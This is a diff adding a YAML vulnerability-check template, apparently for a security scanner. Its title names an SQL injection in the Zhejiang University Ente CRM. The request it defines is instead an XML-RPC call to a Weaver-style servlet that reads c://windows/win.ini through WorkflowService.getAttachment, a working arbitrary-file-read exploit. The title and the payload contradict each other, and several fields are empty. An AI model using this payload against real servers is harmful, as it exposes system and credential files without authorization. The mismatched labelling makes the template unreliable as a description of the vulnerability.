@@ -1,0 +1,37 @@
+id:
+
+info:
+  name: 浙大恩特客户资源管理系统 RegulatePriceAction SQL注入
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    Connection: close
+    Content-Length: 198
+    Accept-Encoding: gzip
+    Content-Type: application/xml
+  data: |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <methodCall>
+    <methodName>WorkflowService.getAttachment</methodName>
+    <params>
+    <param>
+    <value><string>c://windows/win.ini</string></value>
+    </param>
+    </params>
+    </methodCall>
+response1:
+  headers:
+  body: OyBmb3
+  code:
+requests2:
+response2:
+
+
+
+
